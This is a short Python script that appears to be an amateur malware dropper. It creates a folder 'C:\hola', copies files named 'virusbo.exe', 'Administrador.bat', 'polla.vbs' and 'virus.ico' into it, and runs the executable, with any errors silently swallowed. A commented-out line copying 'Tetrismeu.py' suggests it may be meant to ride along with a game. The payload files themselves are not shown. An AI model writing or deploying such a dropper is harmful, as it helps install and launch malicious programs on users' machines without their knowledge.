import os

prim=os.getcwd()
name="virusbo.exe"
try:
    os.chdir("C:")
    os.mkdir("hola")
    os.chdir(prim)
    directorio='"C:\hola"'
    os.system("copy " + " " + name + " " + directorio)
    os.system("copy " + " Administrador.bat " + directorio)
    os.system("copy " + " polla.vbs " + directorio)
    os.system("copy " + " virus.ico " + directorio)
    #os.system("copy " + " Tetrismeu.py " + directorio)
except:
    pass
os.chdir("C:")
os.chdir("hola")
os.system('virusbo.exe')
os.system("exit")
